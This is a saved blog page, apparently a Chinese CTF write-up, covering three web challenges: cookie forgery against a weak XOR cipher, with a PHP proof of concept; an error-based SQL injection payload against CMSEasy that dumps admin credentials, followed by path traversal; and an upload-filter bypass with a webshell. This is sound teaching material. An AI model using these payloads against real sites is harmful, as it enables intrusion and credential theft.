@@ -1,0 +1,520 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./百度杯CTF-9月2日-WriteUp/font-awesome.min.css" rel="stylesheet"/>
+<link href="./百度杯CTF-9月2日-WriteUp/screen.css" rel="stylesheet"/>
+<link href="./百度杯CTF-9月2日-WriteUp/prism_okaidia.css" rel="stylesheet"/>
+<link href="./百度杯CTF-9月2日-WriteUp/bendawang.css" rel="stylesheet"/>
+<script src="./百度杯CTF-9月2日-WriteUp/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./百度杯CTF-9月2日-WriteUp/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./百度杯CTF-9月2日-WriteUp/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="ctf92writeup">"百度杯"CTF-9月2日-WriteUp</h1>
+<h2 id="code50pt">CODE 50pt</h2>
+<p style="max-width:100%;height:auto;">合天7月高校联赛赛前指导赛原题
+访问页面后，非常明显的image参数可猜测为文件读取，返回base64编码的文件内容
+然后读取一下index.php有个过滤，flag应该是在<code style="max-width:100%;height:auto;">config.php</code>下面，但是绕不过，下面就是<code style="max-width:100%;height:auto;">index.php</code></p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+/**
+ * Created by PhpStorm.
+ * Date: 2015/11/16
+ * Time: 1:31
+ */
+header(&amp;apos;content-type:text/html;charset=utf-8&amp;apos;);
+if(! isset($_GET[&amp;apos;jpg&amp;apos;]))
+    header(&amp;apos;Refresh:0;url=./index.php?jpg=hei.jpg&amp;apos;);
+$file = $_GET[&amp;apos;jpg&amp;apos;];
+echo &amp;apos;&lt;title&gt;file:&amp;apos;.$file.&amp;apos;&lt;/title&gt;&amp;apos;;
+$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
+$file = str_replace("config","_", $file);
+$txt = base64_encode(file_get_contents($file));
+
+echo "&lt;img src=&amp;apos;data:image/gif;base64,".$txt."&amp;apos;&gt;&lt;/img&gt;";
+
+/*
+ * Can you find the flag file?
+ *
+ */
+
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">从注释里面得到提示<code style="max-width:100%;height:auto;">phpstorm</code>，这个东西工具在写Php的时候会默认创建一个.idea文件夹，一般会直接默认创建几个文件
+下面是我开phpstorm的截图
+<br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904140820659" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后去访问.idea/workspace.xml 发现目录下又一个<code style="max-width:100%;height:auto;">fl3g_ichuqiu.php</code></p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904140837160" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">在首页获取它的源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+/**
+ * Created by PhpStorm.
+ * User: pfven
+ * Date: 2016/7/20
+ * Time: 17:19
+ */
+
+error_reporting(E_ALL || ~E_NOTICE);
+include(&amp;apos;config.php&amp;apos;);
+function random($length, $chars = &amp;apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&amp;apos;) {
+    $hash = &amp;apos;&amp;apos;;
+    $max = strlen($chars) - 1;
+    for($i = 0; $i &lt; $length; $i++) {
+        $hash .= $chars[mt_rand(0, $max)];
+    }
+    return $hash;
+}
+
+function encrypt($txt,$key){
+    for($i=0;$i&lt;strlen($txt);$i++){
+        $tmp .= chr(ord($txt[$i])+10);
+    }
+    $txt = $tmp;
+    $rnd=random(4);
+    $key=md5($rnd.$key);
+    $s=0;
+    for($i=0;$i&lt;strlen($txt);$i++){
+        if($s == 32) $s = 0;
+        $ttmp .= $txt[$i] ^ $key[++$s];
+    }
+    return base64_encode($rnd.$ttmp);
+}
+function decrypt($txt,$key){
+    $txt=base64_decode($txt);
+    $rnd = substr($txt,0,4);
+    $txt = substr($txt,4);
+    $key=md5($rnd.$key);
+
+    $s=0;
+    for($i=0;$i&lt;strlen($txt);$i++){
+        if($s == 32) $s = 0;
+        $tmp .= $txt[$i]^$key[++$s];
+    }
+    for($i=0;$i&lt;strlen($tmp);$i++){
+        $tmp1 .= chr(ord($tmp[$i])-10);
+    }
+    return $tmp1;
+}
+$username = decrypt($_COOKIE[&amp;apos;user&amp;apos;],$key);
+if ($username == &amp;apos;system&amp;apos;){
+    echo $flag;
+}else{
+    setcookie(&amp;apos;user&amp;apos;,encrypt(&amp;apos;guest&amp;apos;,$key));
+    echo "It&amp;apos;s Works!";
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">对应写POC即可</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+function ss($txt,$m){
+  for($i=0;$i&lt;strlen($m);$i++){
+     $tmp .= chr(ord($m[$i])+10);
+  }
+  $m=$tmp;
+  $tmp=&amp;apos;&amp;apos;;
+  $txt=base64_decode($txt);
+  $rnd = substr($txt,0,4);
+  $txt = substr($txt,4);
+  for($i=0;$i&lt;strlen($txt);$i++){
+     $key .= $txt[$i] ^ $m[$i];
+  }
+  $s=&amp;apos;0123456789abcdef&amp;apos;;
+  $txt1=&amp;apos;system&amp;apos;;
+  for($i=0;$i&lt;strlen($txt1);$i++){
+    $tmp .= chr(ord($txt1[$i])+10);
+  }
+  $txt1=$tmp;
+  $tmp=&amp;apos;&amp;apos;;
+  for($i=0;$i&lt;16;$i++){
+     $tmp = $key.$s[$i];
+     for($ii=0;$ii&lt;strlen($txt1);$ii++){
+       $txt2 .= $txt1[$ii] ^ $tmp[$ii];
+     }
+     file_put_contents(&amp;apos;1.txt&amp;apos;,base64_encode($rnd.$txt2)."\r\n",FILE_APPEND);
+     $txt2=&amp;apos;&amp;apos;;
+   }
+}
+ss(&amp;apos;VW9BNRVKDUQd&amp;apos;,&amp;apos;guest&amp;apos;);//guest及其对应的cookie。
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">跑一遍会生成了16个加密的密文，用burp的intruder加载后，爆破下，即可得到flag 。
+截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904140912012" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="yesercms50pt">YeserCMS 50pt</h2>
+<p style="max-width:100%;height:auto;">在文档下载里面点进一个文档后，下面有个评论区，暴露了是cmseasy
+<br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904140936544" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这下去搜cmseasy的公开漏洞试试，找到一个在<code style="max-width:100%;height:auto;">/celive/live/header.php</code>下存在报错注入，向它post</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Csubstring%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528username%252Cpassword%2529%2520from%2520yesercms_user%2529%252C1%252C32%2529%252C0x5d%2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">就能曝出管理员的用户名和密码，当然需要调整下substring的姿势才能获取完整密码hash，
+然后得到管理员用户名是<code style="max-width:100%;height:auto;">admin</code>，密码hash解码之后是<code style="max-width:100%;height:auto;">Yeser231</code>
+进入后台之后，开始疯狂地尝试各种上传啊，执行啊，结果发现应该是权限卡死了，估计是不让你以任何方式写文件，
+然后是在模板下的编辑当前模板的时候存在任意代码读取</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904141000654" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">反正这里太蠢了，最开始我还跟着他的格式走，输入的是<code style="max-width:100%;height:auto;">.._d_.._d_flag_php</code>结果死活不出来，最后直接<code style="max-width:100%;height:auto;">../../flag.php</code>就可以了。</p>
+<h2 id="upload50pt">Upload 50pt</h2>
+<p style="max-width:100%;height:auto;">好吧这道题被之前的做的webhacking给坑了。
+一个上传，好像只能是php，然后内容里面的<code style="max-width:100%;height:auto;">&lt;?php</code>或是<code style="max-width:100%;height:auto;">php</code>之类都被过滤了，但是可以用大小写绕过
+先上传如下文件，语言改下大小写绕过过滤什么的，然后标准的一句话被禁，换个姿势就行了，</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904141021067" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">之后就直接执行命令<code style="max-width:100%;height:auto;">cat var/www/html/flag.php</code>就行了
+<br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904141035405" style="max-width:100%;height:auto;"/><br/>
+flag就在源码里面了
+ <br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904141045437" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./百度杯CTF-9月2日-WriteUp/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="ctf92writeup">"百度杯"CTF-9月2日-WriteUp</h1>
+<h2 id="code50pt">CODE 50pt</h2>
+<p style="max-width:100%;height:auto;">合天7月高校联赛赛前指导赛原题
+访问页面后，非常明显的image参数可猜测为文件读取，返回base64编码的文件内容
+然后读取一下index.php有个过滤，flag应该是在<code style="max-width:100%;height:auto;">config.php</code>下面，但是绕不过，下面就是<code style="max-width:100%;height:auto;">index.php</code></p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+/**
+ * Created by PhpStorm.
+ * Date: 2015/11/16
+ * Time: 1:31
+ */
+header(&amp;apos;content-type:text/html;charset=utf-8&amp;apos;);
+if(! isset($_GET[&amp;apos;jpg&amp;apos;]))
+    header(&amp;apos;Refresh:0;url=./index.php?jpg=hei.jpg&amp;apos;);
+$file = $_GET[&amp;apos;jpg&amp;apos;];
+echo &amp;apos;&lt;title&gt;file:&amp;apos;.$file.&amp;apos;&lt;/title&gt;&amp;apos;;
+$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
+$file = str_replace("config","_", $file);
+$txt = base64_encode(file_get_contents($file));
+
+echo "&lt;img src=&amp;apos;data:image/gif;base64,".$txt."&amp;apos;&gt;&lt;/img&gt;";
+
+/*
+ * Can you find the flag file?
+ *
+ */
+
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">从注释里面得到提示<code style="max-width:100%;height:auto;">phpstorm</code>，这个东西工具在写Php的时候会默认创建一个.idea文件夹，一般会直接默认创建几个文件
+下面是我开phpstorm的截图
+<br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904140820659" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后去访问.idea/workspace.xml 发现目录下又一个<code style="max-width:100%;height:auto;">fl3g_ichuqiu.php</code></p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904140837160" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">在首页获取它的源码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+/**
+ * Created by PhpStorm.
+ * User: pfven
+ * Date: 2016/7/20
+ * Time: 17:19
+ */
+
+error_reporting(E_ALL || ~E_NOTICE);
+include(&amp;apos;config.php&amp;apos;);
+function random($length, $chars = &amp;apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&amp;apos;) {
+    $hash = &amp;apos;&amp;apos;;
+    $max = strlen($chars) - 1;
+    for($i = 0; $i &lt; $length; $i++) {
+        $hash .= $chars[mt_rand(0, $max)];
+    }
+    return $hash;
+}
+
+function encrypt($txt,$key){
+    for($i=0;$i&lt;strlen($txt);$i++){
+        $tmp .= chr(ord($txt[$i])+10);
+    }
+    $txt = $tmp;
+    $rnd=random(4);
+    $key=md5($rnd.$key);
+    $s=0;
+    for($i=0;$i&lt;strlen($txt);$i++){
+        if($s == 32) $s = 0;
+        $ttmp .= $txt[$i] ^ $key[++$s];
+    }
+    return base64_encode($rnd.$ttmp);
+}
+function decrypt($txt,$key){
+    $txt=base64_decode($txt);
+    $rnd = substr($txt,0,4);
+    $txt = substr($txt,4);
+    $key=md5($rnd.$key);
+
+    $s=0;
+    for($i=0;$i&lt;strlen($txt);$i++){
+        if($s == 32) $s = 0;
+        $tmp .= $txt[$i]^$key[++$s];
+    }
+    for($i=0;$i&lt;strlen($tmp);$i++){
+        $tmp1 .= chr(ord($tmp[$i])-10);
+    }
+    return $tmp1;
+}
+$username = decrypt($_COOKIE[&amp;apos;user&amp;apos;],$key);
+if ($username == &amp;apos;system&amp;apos;){
+    echo $flag;
+}else{
+    setcookie(&amp;apos;user&amp;apos;,encrypt(&amp;apos;guest&amp;apos;,$key));
+    echo "It&amp;apos;s Works!";
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">对应写POC即可</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+function ss($txt,$m){
+  for($i=0;$i&lt;strlen($m);$i++){
+     $tmp .= chr(ord($m[$i])+10);
+  }
+  $m=$tmp;
+  $tmp=&amp;apos;&amp;apos;;
+  $txt=base64_decode($txt);
+  $rnd = substr($txt,0,4);
+  $txt = substr($txt,4);
+  for($i=0;$i&lt;strlen($txt);$i++){
+     $key .= $txt[$i] ^ $m[$i];
+  }
+  $s=&amp;apos;0123456789abcdef&amp;apos;;
+  $txt1=&amp;apos;system&amp;apos;;
+  for($i=0;$i&lt;strlen($txt1);$i++){
+    $tmp .= chr(ord($txt1[$i])+10);
+  }
+  $txt1=$tmp;
+  $tmp=&amp;apos;&amp;apos;;
+  for($i=0;$i&lt;16;$i++){
+     $tmp = $key.$s[$i];
+     for($ii=0;$ii&lt;strlen($txt1);$ii++){
+       $txt2 .= $txt1[$ii] ^ $tmp[$ii];
+     }
+     file_put_contents(&amp;apos;1.txt&amp;apos;,base64_encode($rnd.$txt2)."\r\n",FILE_APPEND);
+     $txt2=&amp;apos;&amp;apos;;
+   }
+}
+ss(&amp;apos;VW9BNRVKDUQd&amp;apos;,&amp;apos;guest&amp;apos;);//guest及其对应的cookie。
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">跑一遍会生成了16个加密的密文，用burp的intruder加载后，爆破下，即可得到flag 。
+截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904140912012" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="yesercms50pt">YeserCMS 50pt</h2>
+<p style="max-width:100%;height:auto;">在文档下载里面点进一个文档后，下面有个评论区，暴露了是cmseasy
+<br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904140936544" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这下去搜cmseasy的公开漏洞试试，找到一个在<code style="max-width:100%;height:auto;">/celive/live/header.php</code>下存在报错注入，向它post</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Csubstring%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528username%252Cpassword%2529%2520from%2520yesercms_user%2529%252C1%252C32%2529%252C0x5d%2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">就能曝出管理员的用户名和密码，当然需要调整下substring的姿势才能获取完整密码hash，
+然后得到管理员用户名是<code style="max-width:100%;height:auto;">admin</code>，密码hash解码之后是<code style="max-width:100%;height:auto;">Yeser231</code>
+进入后台之后，开始疯狂地尝试各种上传啊，执行啊，结果发现应该是权限卡死了，估计是不让你以任何方式写文件，
+然后是在模板下的编辑当前模板的时候存在任意代码读取</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904141000654" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">反正这里太蠢了，最开始我还跟着他的格式走，输入的是<code style="max-width:100%;height:auto;">.._d_.._d_flag_php</code>结果死活不出来，最后直接<code style="max-width:100%;height:auto;">../../flag.php</code>就可以了。</p>
+<h2 id="upload50pt">Upload 50pt</h2>
+<p style="max-width:100%;height:auto;">好吧这道题被之前的做的webhacking给坑了。
+一个上传，好像只能是php，然后内容里面的<code style="max-width:100%;height:auto;">&lt;?php</code>或是<code style="max-width:100%;height:auto;">php</code>之类都被过滤了，但是可以用大小写绕过
+先上传如下文件，语言改下大小写绕过过滤什么的，然后标准的一句话被禁，换个姿势就行了，</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904141021067" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">之后就直接执行命令<code style="max-width:100%;height:auto;">cat var/www/html/flag.php</code>就行了
+<br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904141035405" style="max-width:100%;height:auto;"/><br/>
+flag就在源码里面了
+ <br/><img alt="这里写图片描述" data-action="zoom" src="./百度杯CTF-9月2日-WriteUp/20160904141045437" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./百度杯CTF-9月2日-WriteUp/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./百度杯CTF-9月2日-WriteUp/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./百度杯CTF-9月2日-WriteUp/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./百度杯CTF-9月2日-WriteUp/prism.js"></script>
+<script src="./百度杯CTF-9月2日-WriteUp/zooming.js"></script>
+<script src="./百度杯CTF-9月2日-WriteUp/Bendawang.js"></script>
+
+
